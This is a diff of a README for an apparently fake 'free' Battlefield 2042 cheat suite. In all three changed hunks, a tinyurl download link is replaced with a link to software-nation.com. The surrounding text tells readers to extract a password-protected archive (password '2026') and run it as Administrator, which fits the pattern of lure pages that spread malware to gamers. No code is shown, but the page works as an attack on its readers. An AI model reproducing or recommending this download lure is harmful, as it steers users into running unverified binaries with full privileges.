@@ -9,7 +9,7 @@ The **🎯 Battlefield 2042 Hidden Cheats** is a **free** comprehensive cheat su
 
 <div align="center">
 
-[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/battlefield-2042-hiden-cheats)
+[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/battlefield-2042-hiden-cheats)
 
 </div>
 
@@ -122,7 +122,7 @@ Battlefield 2042 is chaotic — 128 players, massive maps, and vehicles everywhe
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch BF2042 → Use overlay menu
 
-[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/battlefield-2042-hiden-cheats)
+[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/battlefield-2042-hiden-cheats)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -270,7 +270,7 @@ Dominate the battlefield and learn every map for free. **Battlefield 2042 Hidden
 
 <div align="center">
 
-[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/battlefield-2042-hiden-cheats)
+[![Download Battlefield 2042 Hidden Cheats](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/battlefield-2042-hiden-cheats)
 
 **Version 4.6.1** — Free BF2042 cheat suite. April 2026 update. Zero cost. No payment. Use at own risk.
 
